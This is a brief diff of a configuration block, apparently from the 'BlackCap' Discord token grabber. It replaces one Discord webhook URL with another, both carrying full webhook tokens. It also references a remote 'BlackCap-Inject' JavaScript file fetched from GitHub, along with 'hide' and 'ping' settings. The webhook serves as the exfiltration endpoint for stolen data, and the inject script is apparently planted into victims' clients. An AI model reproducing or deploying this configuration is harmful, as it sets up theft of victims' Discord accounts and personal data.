@@ -160,7 +160,7 @@ class Functions(object):
         return __config__.get(e)
 
 __config__ = {
-    'yourwebhookurl': "https://discord.com/api/webhooks/1047648389367595068/PsG0xLIOohnqeMxBJM8fxkhx-OBtcnEY2Tq3VWk4n1OMW7bij-vCWxOFALy1BkOQ5wwS",
+    'yourwebhookurl': "https://discord.com/api/webhooks/1078177677363662848/eum9ah_y8sL84bh3-MrEPDKPBw8hCFSAOt3cDRBXJUjD88vCnTW4rnkSrCLmIQgbfmMw",
     'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     'hide': 'yes',
     'ping': 'no',
